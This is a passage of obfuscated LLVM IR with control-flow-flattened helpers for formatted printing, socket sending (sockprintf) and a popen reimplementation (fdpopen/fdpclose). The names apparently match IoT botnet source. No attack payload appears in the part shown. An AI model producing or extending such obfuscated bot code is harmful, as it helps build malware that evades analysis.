  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -1833725873, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 740644872, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 156867654, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 451686640, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1440128561, i32 -1356869656
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -384927298, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 451686640, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 407994098, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -965987122, i32 -460877947
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -548333828, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 407994098, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1003248469, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1003248469, label %first
    i32 199143364, label %26
    i32 -285760783, label %34
    i32 -683650450, label %38
    i32 -822850368, label %42
    i32 -1900871779, label %46
    i32 428058578, label %49
    i32 21600321, label %54
    i32 -2068084504, label %58
    i32 -450150108, label %65
    i32 -867484269, label %71
    i32 -299754987, label %80
    i32 1472467077, label %84
    i32 347996431, label %88
    i32 1015542314, label %93
    i32 1578721673, label %99
    i32 1353568559, label %102
    i32 -1701420804, label %103
    i32 1359844543, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 199143364, i32 -285760783
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1359844543, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -683650450, i32 428058578
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -822850368, i32 428058578
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -1900871779, i32 428058578
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 428058578, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 21600321, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -2068084504, i32 -299754987
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -450150108, i32 -867484269
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -867484269, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 21600321, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1472467077, i32 -1701420804
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 347996431, i32 1578721673
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1015542314, i32 1578721673
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 1353568559, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 1353568559, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1701420804, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1359844543, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 1956345384, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1956345384, label %first
    i32 -1405050520, label %8
    i32 1325997474, label %16
    i32 -1002133103, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -1405050520, i32 1325997474
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -1002133103, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -1002133103, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2040686856, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -2040686856, label %first
    i32 722842500, label %15
    i32 1151971085, label %21
    i32 -299363146, label %28
    i32 -419366252, label %29
    i32 2037624145, label %34
    i32 2080417705, label %35
    i32 -23090854, label %39
    i32 1292234740, label %43
    i32 -1687344643, label %44
    i32 1793570770, label %54
    i32 -900647401, label %55
    i32 -462062355, label %61
    i32 -651421243, label %NodeBlock
    i32 560387760, label %LeafBlock1
    i32 419799877, label %LeafBlock
    i32 -1585806392, label %66
    i32 1938896702, label %73
    i32 1595297025, label %79
    i32 -727629114, label %84
    i32 513719879, label %91
    i32 1822656477, label %95
    i32 539810906, label %100
    i32 -149901218, label %107
    i32 2086181109, label %111
    i32 -237108597, label %NewDefault
    i32 1938333276, label %112
    i32 664748901, label %118
    i32 -1414372852, label %124
    i32 351889780, label %130
    i32 -1759420256, label %137
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 722842500, i32 1151971085
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 -299363146, i32 1151971085
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 -299363146, i32 -419366252
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 2037624145, i32 2080417705
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -23090854, i32 -462062355
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 1292234740, i32 -1687344643
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 1793570770, i32 -900647401
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 -462062355, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 -651421243, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 419799877, i32 560387760
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 1938896702, i32 -237108597
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -1585806392, i32 -237108597
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 1595297025, i32 1822656477
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -727629114, i32 513719879
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 513719879, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 2086181109, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 539810906, i32 -149901218
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 -149901218, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 2086181109, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 1938333276, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8*, i8** %5, align 8
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 114
  %117 = select i1 %116, i32 664748901, i32 -1414372852
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %120 = load i32, i32* %119, align 4
  store i32 %120, i32* %6, align 4
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %122 = load i32, i32* %121, align 4
  %123 = call i32 @close(i32 %122)
  store i32 351889780, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %126 = load i32, i32* %125, align 4
  store i32 %126, i32* %6, align 4
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %128 = load i32, i32* %127, align 4
  %129 = call i32 @close(i32 %128)
  store i32 351889780, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %9, align 4
  %132 = load i32*, i32** @fdopen_pids, align 8
  %133 = load i32, i32* %6, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 %131, i32* %135, align 4
  %136 = load i32, i32* %6, align 4
  store i32 %136, i32* %3, align 4
  store i32 -1759420256, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %3, align 4
  ret i32 %138

loopEnd:                                          ; preds = %130, %124, %118, %112, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 1484907265, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1484907265, label %first
    i32 1761631854, label %13
    i32 1333159476, label %21
    i32 736505777, label %22
    i32 1536371665, label %30
    i32 -623868406, label %37
    i32 -590557069, label %41
    i32 550036898, label %45
    i32 -395102616, label %47
    i32 1888361201, label %56
    i32 1774909016, label %57
    i32 -337353973, label %64
    i32 1189906080, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 1333159476, i32 1761631854
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 1333159476, i32 736505777
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 1189906080, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 1536371665, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -623868406, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -590557069, i32 550036898
